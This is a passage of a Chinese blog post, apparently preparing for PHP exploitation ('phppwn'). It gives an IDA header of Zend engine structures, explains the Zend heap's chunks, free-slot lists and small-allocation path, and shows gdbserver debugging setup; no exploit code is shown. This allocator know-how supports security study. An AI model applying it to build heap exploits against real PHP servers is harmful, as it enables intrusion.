file&lt;/code&gt;，然后选择这个头文件导入。&lt;/p&gt;&#xA;&lt;p&gt;导入后就能看到&lt;code&gt;Local Types&lt;/code&gt;中有相关的结构体&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;使用方式：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;右键需要convert的变量，选择&lt;code&gt;Convert to struct *...&lt;/code&gt;，其中常用的结构体有：&lt;code&gt;zval&lt;/code&gt;、&lt;code&gt;string&lt;/code&gt;、&lt;code&gt;array&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;至于相关变量结构体改成类似&lt;code&gt;IS_ARRAY&lt;/code&gt;。右键需要改的数字，选择&lt;code&gt;Enum&lt;/code&gt;，选择&lt;code&gt;zend_type&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;zval&lt;/code&gt;类型还需要额外设置union类型&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;//php_struct.h&#xD;&#xA;&#xD;&#xA;//定义基本类型&#xD;&#xA;typedef unsigned char uint8_t;&#xD;&#xA;typedef unsigned short uint16_t;&#xD;&#xA;typedef unsigned int uint32_t;&#xD;&#xA;typedef unsigned long long uint64_t;&#xD;&#xA;typedef long long int64_t;&#xD;&#xA;&#xD;&#xA;typedef unsigned char      zend_uchar;&#xD;&#xA;typedef long long          zend_long;&#xD;&#xA;typedef unsigned long zend_ulong;&#xD;&#xA;&#xD;&#xA;//zval.u1.type类型&#xD;&#xA;typedef enum {&#xD;&#xA;    IS_NULL = 0,&#xD;&#xA;    IS_FALSE = 1,&#xD;&#xA;    IS_TRUE = 2,&#xD;&#xA;    IS_LONG = 4,&#xD;&#xA;    IS_DOUBLE = 5,&#xD;&#xA;    IS_STRING = 6,&#xD;&#xA;    IS_ARRAY = 7,&#xD;&#xA;    IS_OBJECT = 8,&#xD;&#xA;    IS_RESOURCE = 9,&#xD;&#xA;    IS_REFERENCE = 10,&#xD;&#xA;    IS_CONSTANT = 11,&#xD;&#xA;    IS_CONSTANT_AS = 12,&#xD;&#xA;    _IS_BOOL = 13,&#xD;&#xA;    IS_CALLABLE = 14,&#xD;&#xA;    IS_INDIRECT = 15,&#xD;&#xA;    IS_PTR = 17&#xD;&#xA;} zend_type;&#xD;&#xA;&#xD;&#xA;//前置声明&#xD;&#xA;typedef struct _zval_struct zval;&#xD;&#xA;typedef struct _zend_array HashTable;&#xD;&#xA;typedef struct _zend_string zend_string;&#xD;&#xA;typedef struct _zend_object zend_object;&#xD;&#xA;typedef struct _zend_resource zend_resource;&#xD;&#xA;typedef struct _Bucket Bucket;&#xD;&#xA;typedef void (*dtor_func_t)(zval *pDest);&#xD;&#xA;typedef struct _zend_reference  zend_reference;&#xD;&#xA;typedef struct _zend_ast_ref    zend_ast_ref;&#xD;&#xA;typedef struct _zend_object_handlers zend_object_handlers;&#xD;&#xA;typedef struct _zend_class_entry     zend_class_entry;&#xD;&#xA;typedef union  _zend_function        zend_function;&#xD;&#xA;typedef struct _zend_refcounted_v zend_refcounted_v;&#xD;&#xA;&#xD;&#xA;//zend_refcounted_h&#xD;&#xA;typedef struct _zend_refcounted_v {&#xD;&#xA;    uint8_t    type;&#xD;&#xA;    uint8_t    flags;&#xD;&#xA;    uint16_t   gc_info;&#xD;&#xA;} zend_refcounted_v;&#xD;&#xA;&#xD;&#xA;typedef union _zend_refcounted_u {&#xD;&#xA;    zend_refcounted_v v;&#xD;&#xA;    uint32_t type_info;&#xD;&#xA;} zend_refcounted_u;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_refcounted_h {&#xD;&#xA;    uint32_t refcount;&#xD;&#xA;    zend_refcounted_u u;&#xD;&#xA;} zend_refcounted_h;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;//_zend_string&#xD;&#xA;typedef struct _zend_string {&#xD;&#xA;    zend_refcounted_h gc;  // 8字节&#xD;&#xA;    uint64_t h;            // 8字节&#xD;&#xA;    uint32_t len;          // 4字节&#xD;&#xA;    char val[1];           // 1字节（&amp;#43;3字节padding，对齐到8）&#xD;&#xA;}string;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;typedef struct _zval_u1_v {&#xD;&#xA;    uint8_t type;&#xD;&#xA;    uint8_t type_flags;&#xD;&#xA;    uint8_t const_flags;&#xD;&#xA;    uint8_t reserved;&#xD;&#xA;} zval_u1_v;&#xD;&#xA;&#xD;&#xA;typedef union _zval_u1 {&#xD;&#xA;    zval_u1_v v;&#xD;&#xA;    uint32_t type_info;&#xD;&#xA;} zval_u1;&#xD;&#xA;&#xD;&#xA;typedef union _zval_u2 {&#xD;&#xA;    uint32_t var_flags;&#xD;&#xA;    uint32_t next;&#xD;&#xA;    uint32_t cache_slot;&#xD;&#xA;    uint32_t lineno;&#xD;&#xA;    uint32_t num_args;&#xD;&#xA;    uint32_t fe_pos;&#xD;&#xA;} zval_u2;&#xD;&#xA;&#xD;&#xA;//这里一些对象使用void*避免具体类型&#xD;&#xA;typedef union _zend_value {&#xD;&#xA;    zend_long         lval;&#xD;&#xA;    double            dval;&#xD;&#xA;    void             *counted;&#xD;&#xA;    zend_string      *str;&#xD;&#xA;    HashTable        *arr;&#xD;&#xA;    zend_object      *obj;&#xD;&#xA;    zend_resource    *res;&#xD;&#xA;    zend_reference   *ref;&#xD;&#xA;    zend_ast_ref     *ast;&#xD;&#xA;    _zval_struct     *zv;&#xD;&#xA;    void             *ptr;&#xD;&#xA;    zend_class_entry *ce;&#xD;&#xA;    zend_function    *func;&#xD;&#xA;    struct {&#xD;&#xA;        uint32_t w1;&#xD;&#xA;        uint32_t w2;&#xD;&#xA;    } ww;&#xD;&#xA;} zend_value;&#xD;&#xA;&#xD;&#xA;typedef struct _zval_struct {&#xD;&#xA;    zend_value value;  // 8字节&#xD;&#xA;    zval_u1 u1;        // 4字节&#xD;&#xA;    zval_u2 u2;        // 4字节&#xD;&#xA;}zval;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;//_zend_array&#xD;&#xA;typedef struct _Bucket {&#xD;&#xA;    _zval_struct      val;&#xD;&#xA;    zend_ulong        h;&#xD;&#xA;    _zend_string      *key;&#xD;&#xA;}Bucket;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_array_v&#xD;&#xA;{&#xD;&#xA;    zend_uchar    flags;&#xD;&#xA;    zend_uchar    nApplyCount;&#xD;&#xA;    zend_uchar    nIteratorsCount;&#xD;&#xA;    zend_uchar    reserve;&#xD;&#xA;}_zend_array_v;&#xD;&#xA;&#xD;&#xA;typedef union _zend_array_u&#xD;&#xA;{&#xD;&#xA;    _zend_array_v v;&#xD;&#xA;    uint32_t flag;&#xD;&#xA;}_zend_array_u;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_array&#xD;&#xA;{&#xD;&#xA;    zend_refcounted_h gc; //8字节&#xD;&#xA;    _zend_array_u u;&#xD;&#xA;    uint32_t          nTableMask;&#xD;&#xA;    Bucket           *arData;&#xD;&#xA;    uint32_t          nNumUsed;&#xD;&#xA;    uint32_t          nNumOfElements;&#xD;&#xA;    uint32_t          nTableSize; &#xD;&#xA;    uint32_t          nInternalPointer; &#xD;&#xA;    zend_long         nNextFreeElement;&#xD;&#xA;    dtor_func_t       pDestructor;&#xD;&#xA;}HashTable;&#xD;&#xA;&#xD;&#xA;//_zend_resource&#xD;&#xA;typedef struct _zend_resource {&#xD;&#xA;    zend_refcounted_h gc;&#xD;&#xA;    int               handle;&#xD;&#xA;    int               type;&#xD;&#xA;    void             *ptr;&#xD;&#xA;}zend_resource;&#xD;&#xA;&#xD;&#xA;//_zend_object&#xD;&#xA;typedef struct _zend_object {&#xD;&#xA;    zend_refcounted_h           gc;&#xD;&#xA;    uint32_t                    handle;&#xD;&#xA;    zend_class_entry           *ce;&#xD;&#xA;    const zend_object_handlers *handlers;&#xD;&#xA;    HashTable                  *properties;&#xD;&#xA;    _zval_struct                properties_table[1];&#xD;&#xA;}zend_object;&#xD;&#xA;typedef _zend_array array;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;php堆内存管理&#34;&gt;&lt;span&gt;php堆内存管理&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#php%e5%a0%86%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;基本数据结构&#34;&gt;&lt;span&gt;基本数据结构&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;struct _zend_mm_heap {&#xD;&#xA;#if ZEND_MM_STAT&#xD;&#xA;    size_t             size; //当前已用内存数&#xD;&#xA;    size_t             peak; //内存单次申请的峰值&#xD;&#xA;#endif&#xD;&#xA;    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部&#xD;&#xA;    ...&#xD;&#xA;    zend_mm_huge_list *huge_list;               //大内存链表&#xD;&#xA;    zend_mm_chunk     *main_chunk;              //指向chunk链表头部&#xD;&#xA;    zend_mm_chunk     *cached_chunks;           //缓存的chunk链表&#xD;&#xA;    int                chunks_count;            //已分配chunk数&#xD;&#xA;    int                peak_chunks_count;       //当前request使用chunk峰值&#xD;&#xA;    int                cached_chunks_count;     //缓存的chunk数&#xD;&#xA;    double             avg_chunks_count;        //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count&amp;#43;peak_chunks_count)/2.0&#xD;&#xA;}&#xD;&#xA;struct _zend_mm_chunk {&#xD;&#xA;    zend_mm_heap      *heap; //指向heap&#xD;&#xA;    zend_mm_chunk     *next; //指向下一个chunk&#xD;&#xA;    zend_mm_chunk     *prev; //指向上一个chunk&#xD;&#xA;    int                free_pages; //当前chunk的剩余page数&#xD;&#xA;    int                free_tail;               /* number of free pages at the end of chunk */&#xD;&#xA;    int                num;&#xD;&#xA;    char               reserve[64 - (sizeof(void*) * 3 &amp;#43; sizeof(int) * 3)];&#xD;&#xA;    zend_mm_heap       heap_slot; //heap结构，只有主chunk会用到&#xD;&#xA;    zend_mm_page_map   free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位&#xD;&#xA;    zend_mm_page_info  map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等&#xD;&#xA;};&#xD;&#xA;//按固定大小切好的small内存槽&#xD;&#xA;struct _zend_mm_free_slot {&#xD;&#xA;    zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/zend_heap.png&#34; title=&#34;/img/phppwn/zend_heap.png&#34; data-thumbnail=&#34;/img/phppwn/zend_heap.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/zend_heap.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/zend_heap.png&#39; alt=&#34;/img/phppwn/zend_heap.png&#34;&gt;&lt;/a&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;small内存分配&#34;&gt;&lt;span&gt;small内存分配&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#small%e5%86%85%e5%ad%98%e5%88%86%e9%85%8d&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;emalloc&lt;/code&gt;的底层函数，简化后：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size)&#xD;&#xA;{&#xD;&#xA;    void *ptr;&#xD;&#xA;&#xD;&#xA;#if ZEND_DEBUG&#xD;&#xA;    size_t real_size = size;&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;    // ---- 1. 小块分配 ----&#xD;&#xA;    if (size &amp;lt;= ZEND_MM_MAX_SMALL_SIZE) {&#xD;&#xA;        ptr = zend_mm_alloc_small(heap, size);&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    // ---- 2. 中等块分配 ----&#xD;&#xA;    else if (size &amp;lt;= ZEND_MM_MAX_LARGE_SIZE) {&#xD;&#xA;        ptr = zend_mm_alloc_large(heap, size);&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    // ---- 3. 超大块分配 ----&#xD;&#xA;    else {&#xD;&#xA;        ptr = zend_mm_alloc_huge(heap, size);&#xD;&#xA;    }&#xD;&#xA;    return ptr;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看出php申请的堆块根据大小分三种：&lt;code&gt;small&lt;/code&gt;、&lt;code&gt;large&lt;/code&gt;、&lt;code&gt;huge&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;其中&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#define ZEND_MM_MIN_SMALL_SIZE&#x9;&#x9;8&#xD;&#xA;#define ZEND_MM_MAX_SMALL_SIZE      3072&#x9;//3KB&#xD;&#xA;#define ZEND_MM_MAX_LARGE_SIZE      (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE))&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;小于&lt;code&gt;3KB&lt;/code&gt;-&amp;gt;&lt;code&gt;small&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;大于&lt;code&gt;3KB&lt;/code&gt;，小于&lt;code&gt;2044KB&lt;/code&gt;(511 page_size)，不是512个page是因为第一个page用于存储&lt;code&gt;_zend_mm_heap&lt;/code&gt;结构体&lt;/li&gt;&#xA;&lt;li&gt;大于&lt;code&gt;2MB&lt;/code&gt;-&amp;gt;&lt;code&gt;huge&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;zend_mm_alloc_small&#34;&gt;&lt;span&gt;zend_mm_alloc_small&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#zend_mm_alloc_small&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)&#xD;&#xA;{&#xD;&#xA;&#x9;ZEND_ASSERT(bin_data_size[bin_num] &amp;gt;= ZEND_MM_MIN_USEABLE_BIN_SIZE);&#xD;&#xA;&#xD;&#xA;#if ZEND_MM_STAT&#xD;&#xA;&#x9;do {&#xD;&#xA;&#x9;&#x9;size_t size = heap-&amp;gt;size &amp;#43; bin_data_size[bin_num];&#xD;&#xA;&#x9;&#x9;size_t peak = MAX(heap-&amp;gt;peak, size);&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;size = size;&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;peak = peak;&#xD;&#xA;&#x9;} while (0);&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;&#x9;if (EXPECTED(heap-&amp;gt;free_slot[bin_num] != NULL)) {&#xD;&#xA;&#x9;&#x9;zend_mm_free_slot *p = heap-&amp;gt;free_slot[bin_num];&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;free_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p);&#xD;&#xA;&#x9;&#x9;return p;&#xD;&#xA;&#x9;} else {&#xD;&#xA;&#x9;&#x9;return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);&#xD;&#xA;&#x9;}&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相应size的&lt;code&gt;free_slot&lt;/code&gt;中有堆块就从&lt;code&gt;free_slot&lt;/code&gt;中取第一个，并更新&lt;code&gt;free_slot&lt;/code&gt;链表头&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot)&#xD;&#xA;{&#xD;&#xA;&#x9;zend_mm_free_slot *next = slot-&amp;gt;next_free_slot;&#xD;&#xA;&#x9;if (EXPECTED(next != NULL)) {&#xD;&#xA;&#x9;&#x9;zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num);&#xD;&#xA;&#x9;&#x9;if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) {&#xD;&#xA;&#x9;&#x9;&#x9;zend_mm_panic(&amp;#34;zend_mm_heap corrupted&amp;#34;);&#xD;&#xA;&#x9;&#x9;}&#xD;&#xA;&#x9;}&#xD;&#xA;&#x9;return (zend_mm_free_slot*)next;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没有的话就执行**&lt;code&gt;zend_mm_alloc_small_slow&lt;/code&gt;**，这个函数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;向堆申请新的页&lt;/li&gt;&#xA;&lt;li&gt;将页分成多个小块，返回第一个小块&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;其他块链入相应的&lt;code&gt;slot&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;phpgdb&#34;&gt;&lt;span&gt;phpgdb&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#phpgdb&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;调试用的这位师傅写的东西：&lt;a href=&#34;https://github.com/GeekCmore/phpdbg&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;phpdbg&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里如果执行&lt;code&gt;sudo apt install php-cli-dbgsym&lt;/code&gt;报错可以：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt update&#xD;&#xA;sudo apt install ubuntu-dbgsym-keyring -y&#xD;&#xA;&#xD;&#xA;sudo tee /etc/apt/sources.list.d/ddebs.list &amp;lt;&amp;lt;&amp;#39;EOF&amp;#39;&#xD;&#xA;deb http://ddebs.ubuntu.com noble main restricted universe multiverse&#xD;&#xA;deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse&#xD;&#xA;EOF&#xD;&#xA;&#xD;&#xA;sudo apt update&#xD;&#xA;&#xD;&#xA;sudo apt install php8.3-cli-dbgsym -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种方式只能下8.3版本的符号表，如果还要其他版本的符号表：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo add-apt-repository ppa:ondrej/php -y&#xD;&#xA;sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把&lt;code&gt;Components: main&lt;/code&gt;修改成：&lt;code&gt;Components: main main/debug&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;再&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt update&#xD;&#xA;sudo apt install php8.4-cli-dbgsym&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;容器与容器之间进行调试&#34;&gt;&lt;span&gt;容器与容器之间进行调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%b9%e5%99%a8%e4%b8%8e%e5%ae%b9%e5%99%a8%e4%b9%8b%e9%97%b4%e8%bf%9b%e8%a1%8c%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;两个容器都要下载gdbserver&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y gdbserver&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后被连接的容器：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdbserver :8888 --args php ./exp.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还要获取被连接容器的ip：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;hostname -i&#xD;&#xA;172.17.0.3&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后用另一个容器去连接：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdb&#xD;&#xA;target remote 172.17.0.3:8888&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;容器与wsl2之间进行调试&#34;&gt;&lt;span&gt;容器与wsl2之间进行调试&lt;/span&gt;&#xD;&#xA;  &lt;a 